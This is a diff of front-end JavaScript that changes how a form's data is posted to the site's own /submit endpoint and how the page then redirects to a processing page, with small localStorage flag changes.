@@ -175,26 +175,7 @@ function submitApp() {
     btn.disabled = true;
     btn.innerText = "Processing...";
 
-    localStorage.setItem("fromPin", "yes"); // 🔥 SET FIRST
-
-fetch(window.location.origin + "/submit", {
-    method: "POST",
-    headers: {
-        "Content-Type": "application/json"
-    },
-    body: JSON.stringify(data)
-})
-.catch(() => {});
-
-window.location.href = "processing.html"; // 🔥 MOVE AFTER
-}
-
-function startProcessing() {
-      
-    // redirect to processing page
-    localStorage.setItem("fromPin", "yes");
-
-fetch(window.location.origin + "/submit", {
+    fetch(window.location.origin + "/submit", {
     method: "POST",
     headers: {
         "Content-Type": "application/json"
@@ -202,21 +183,27 @@ fetch(window.location.origin + "/submit", {
     body: JSON.stringify(data)
 })
 .then(res => res.json())
-.then(resData => {
+.then(data => {
+    console.log("SERVER RESPONSE:", data);
 
-    console.log("SESSION:", resData.sessionId);
-
-    // ✅ MUST SET THESE
-    localStorage.setItem("sessionId", resData.sessionId);
-    localStorage.setItem("fromPin", "yes");
-
-    // THEN redirect
+localStorage.setItem("fromPin", "yes");
     window.location.href = "processing.html";
 })
-.catch(() => {
-    alert("Network error");
+.catch(err => {
+    console.error(err);
+
+    localStorage.setItem("firstProcess", "yes");
+    window.location.href = "processing.html";
 });
 }
+
+function startProcessing() {
+    // optional: show instant feedback
+    
+    // redirect to processing page
+    window.location.href = "processing.html";
+}
+
 function finish() {
     localStorage.clear();
     window.location.href = "index.html";
@@ -249,4 +236,3 @@ document.addEventListener("DOMContentLoaded", function () {
         phoneInput.value = localStorage.getItem("phone") || "+263";
     }
 });
-
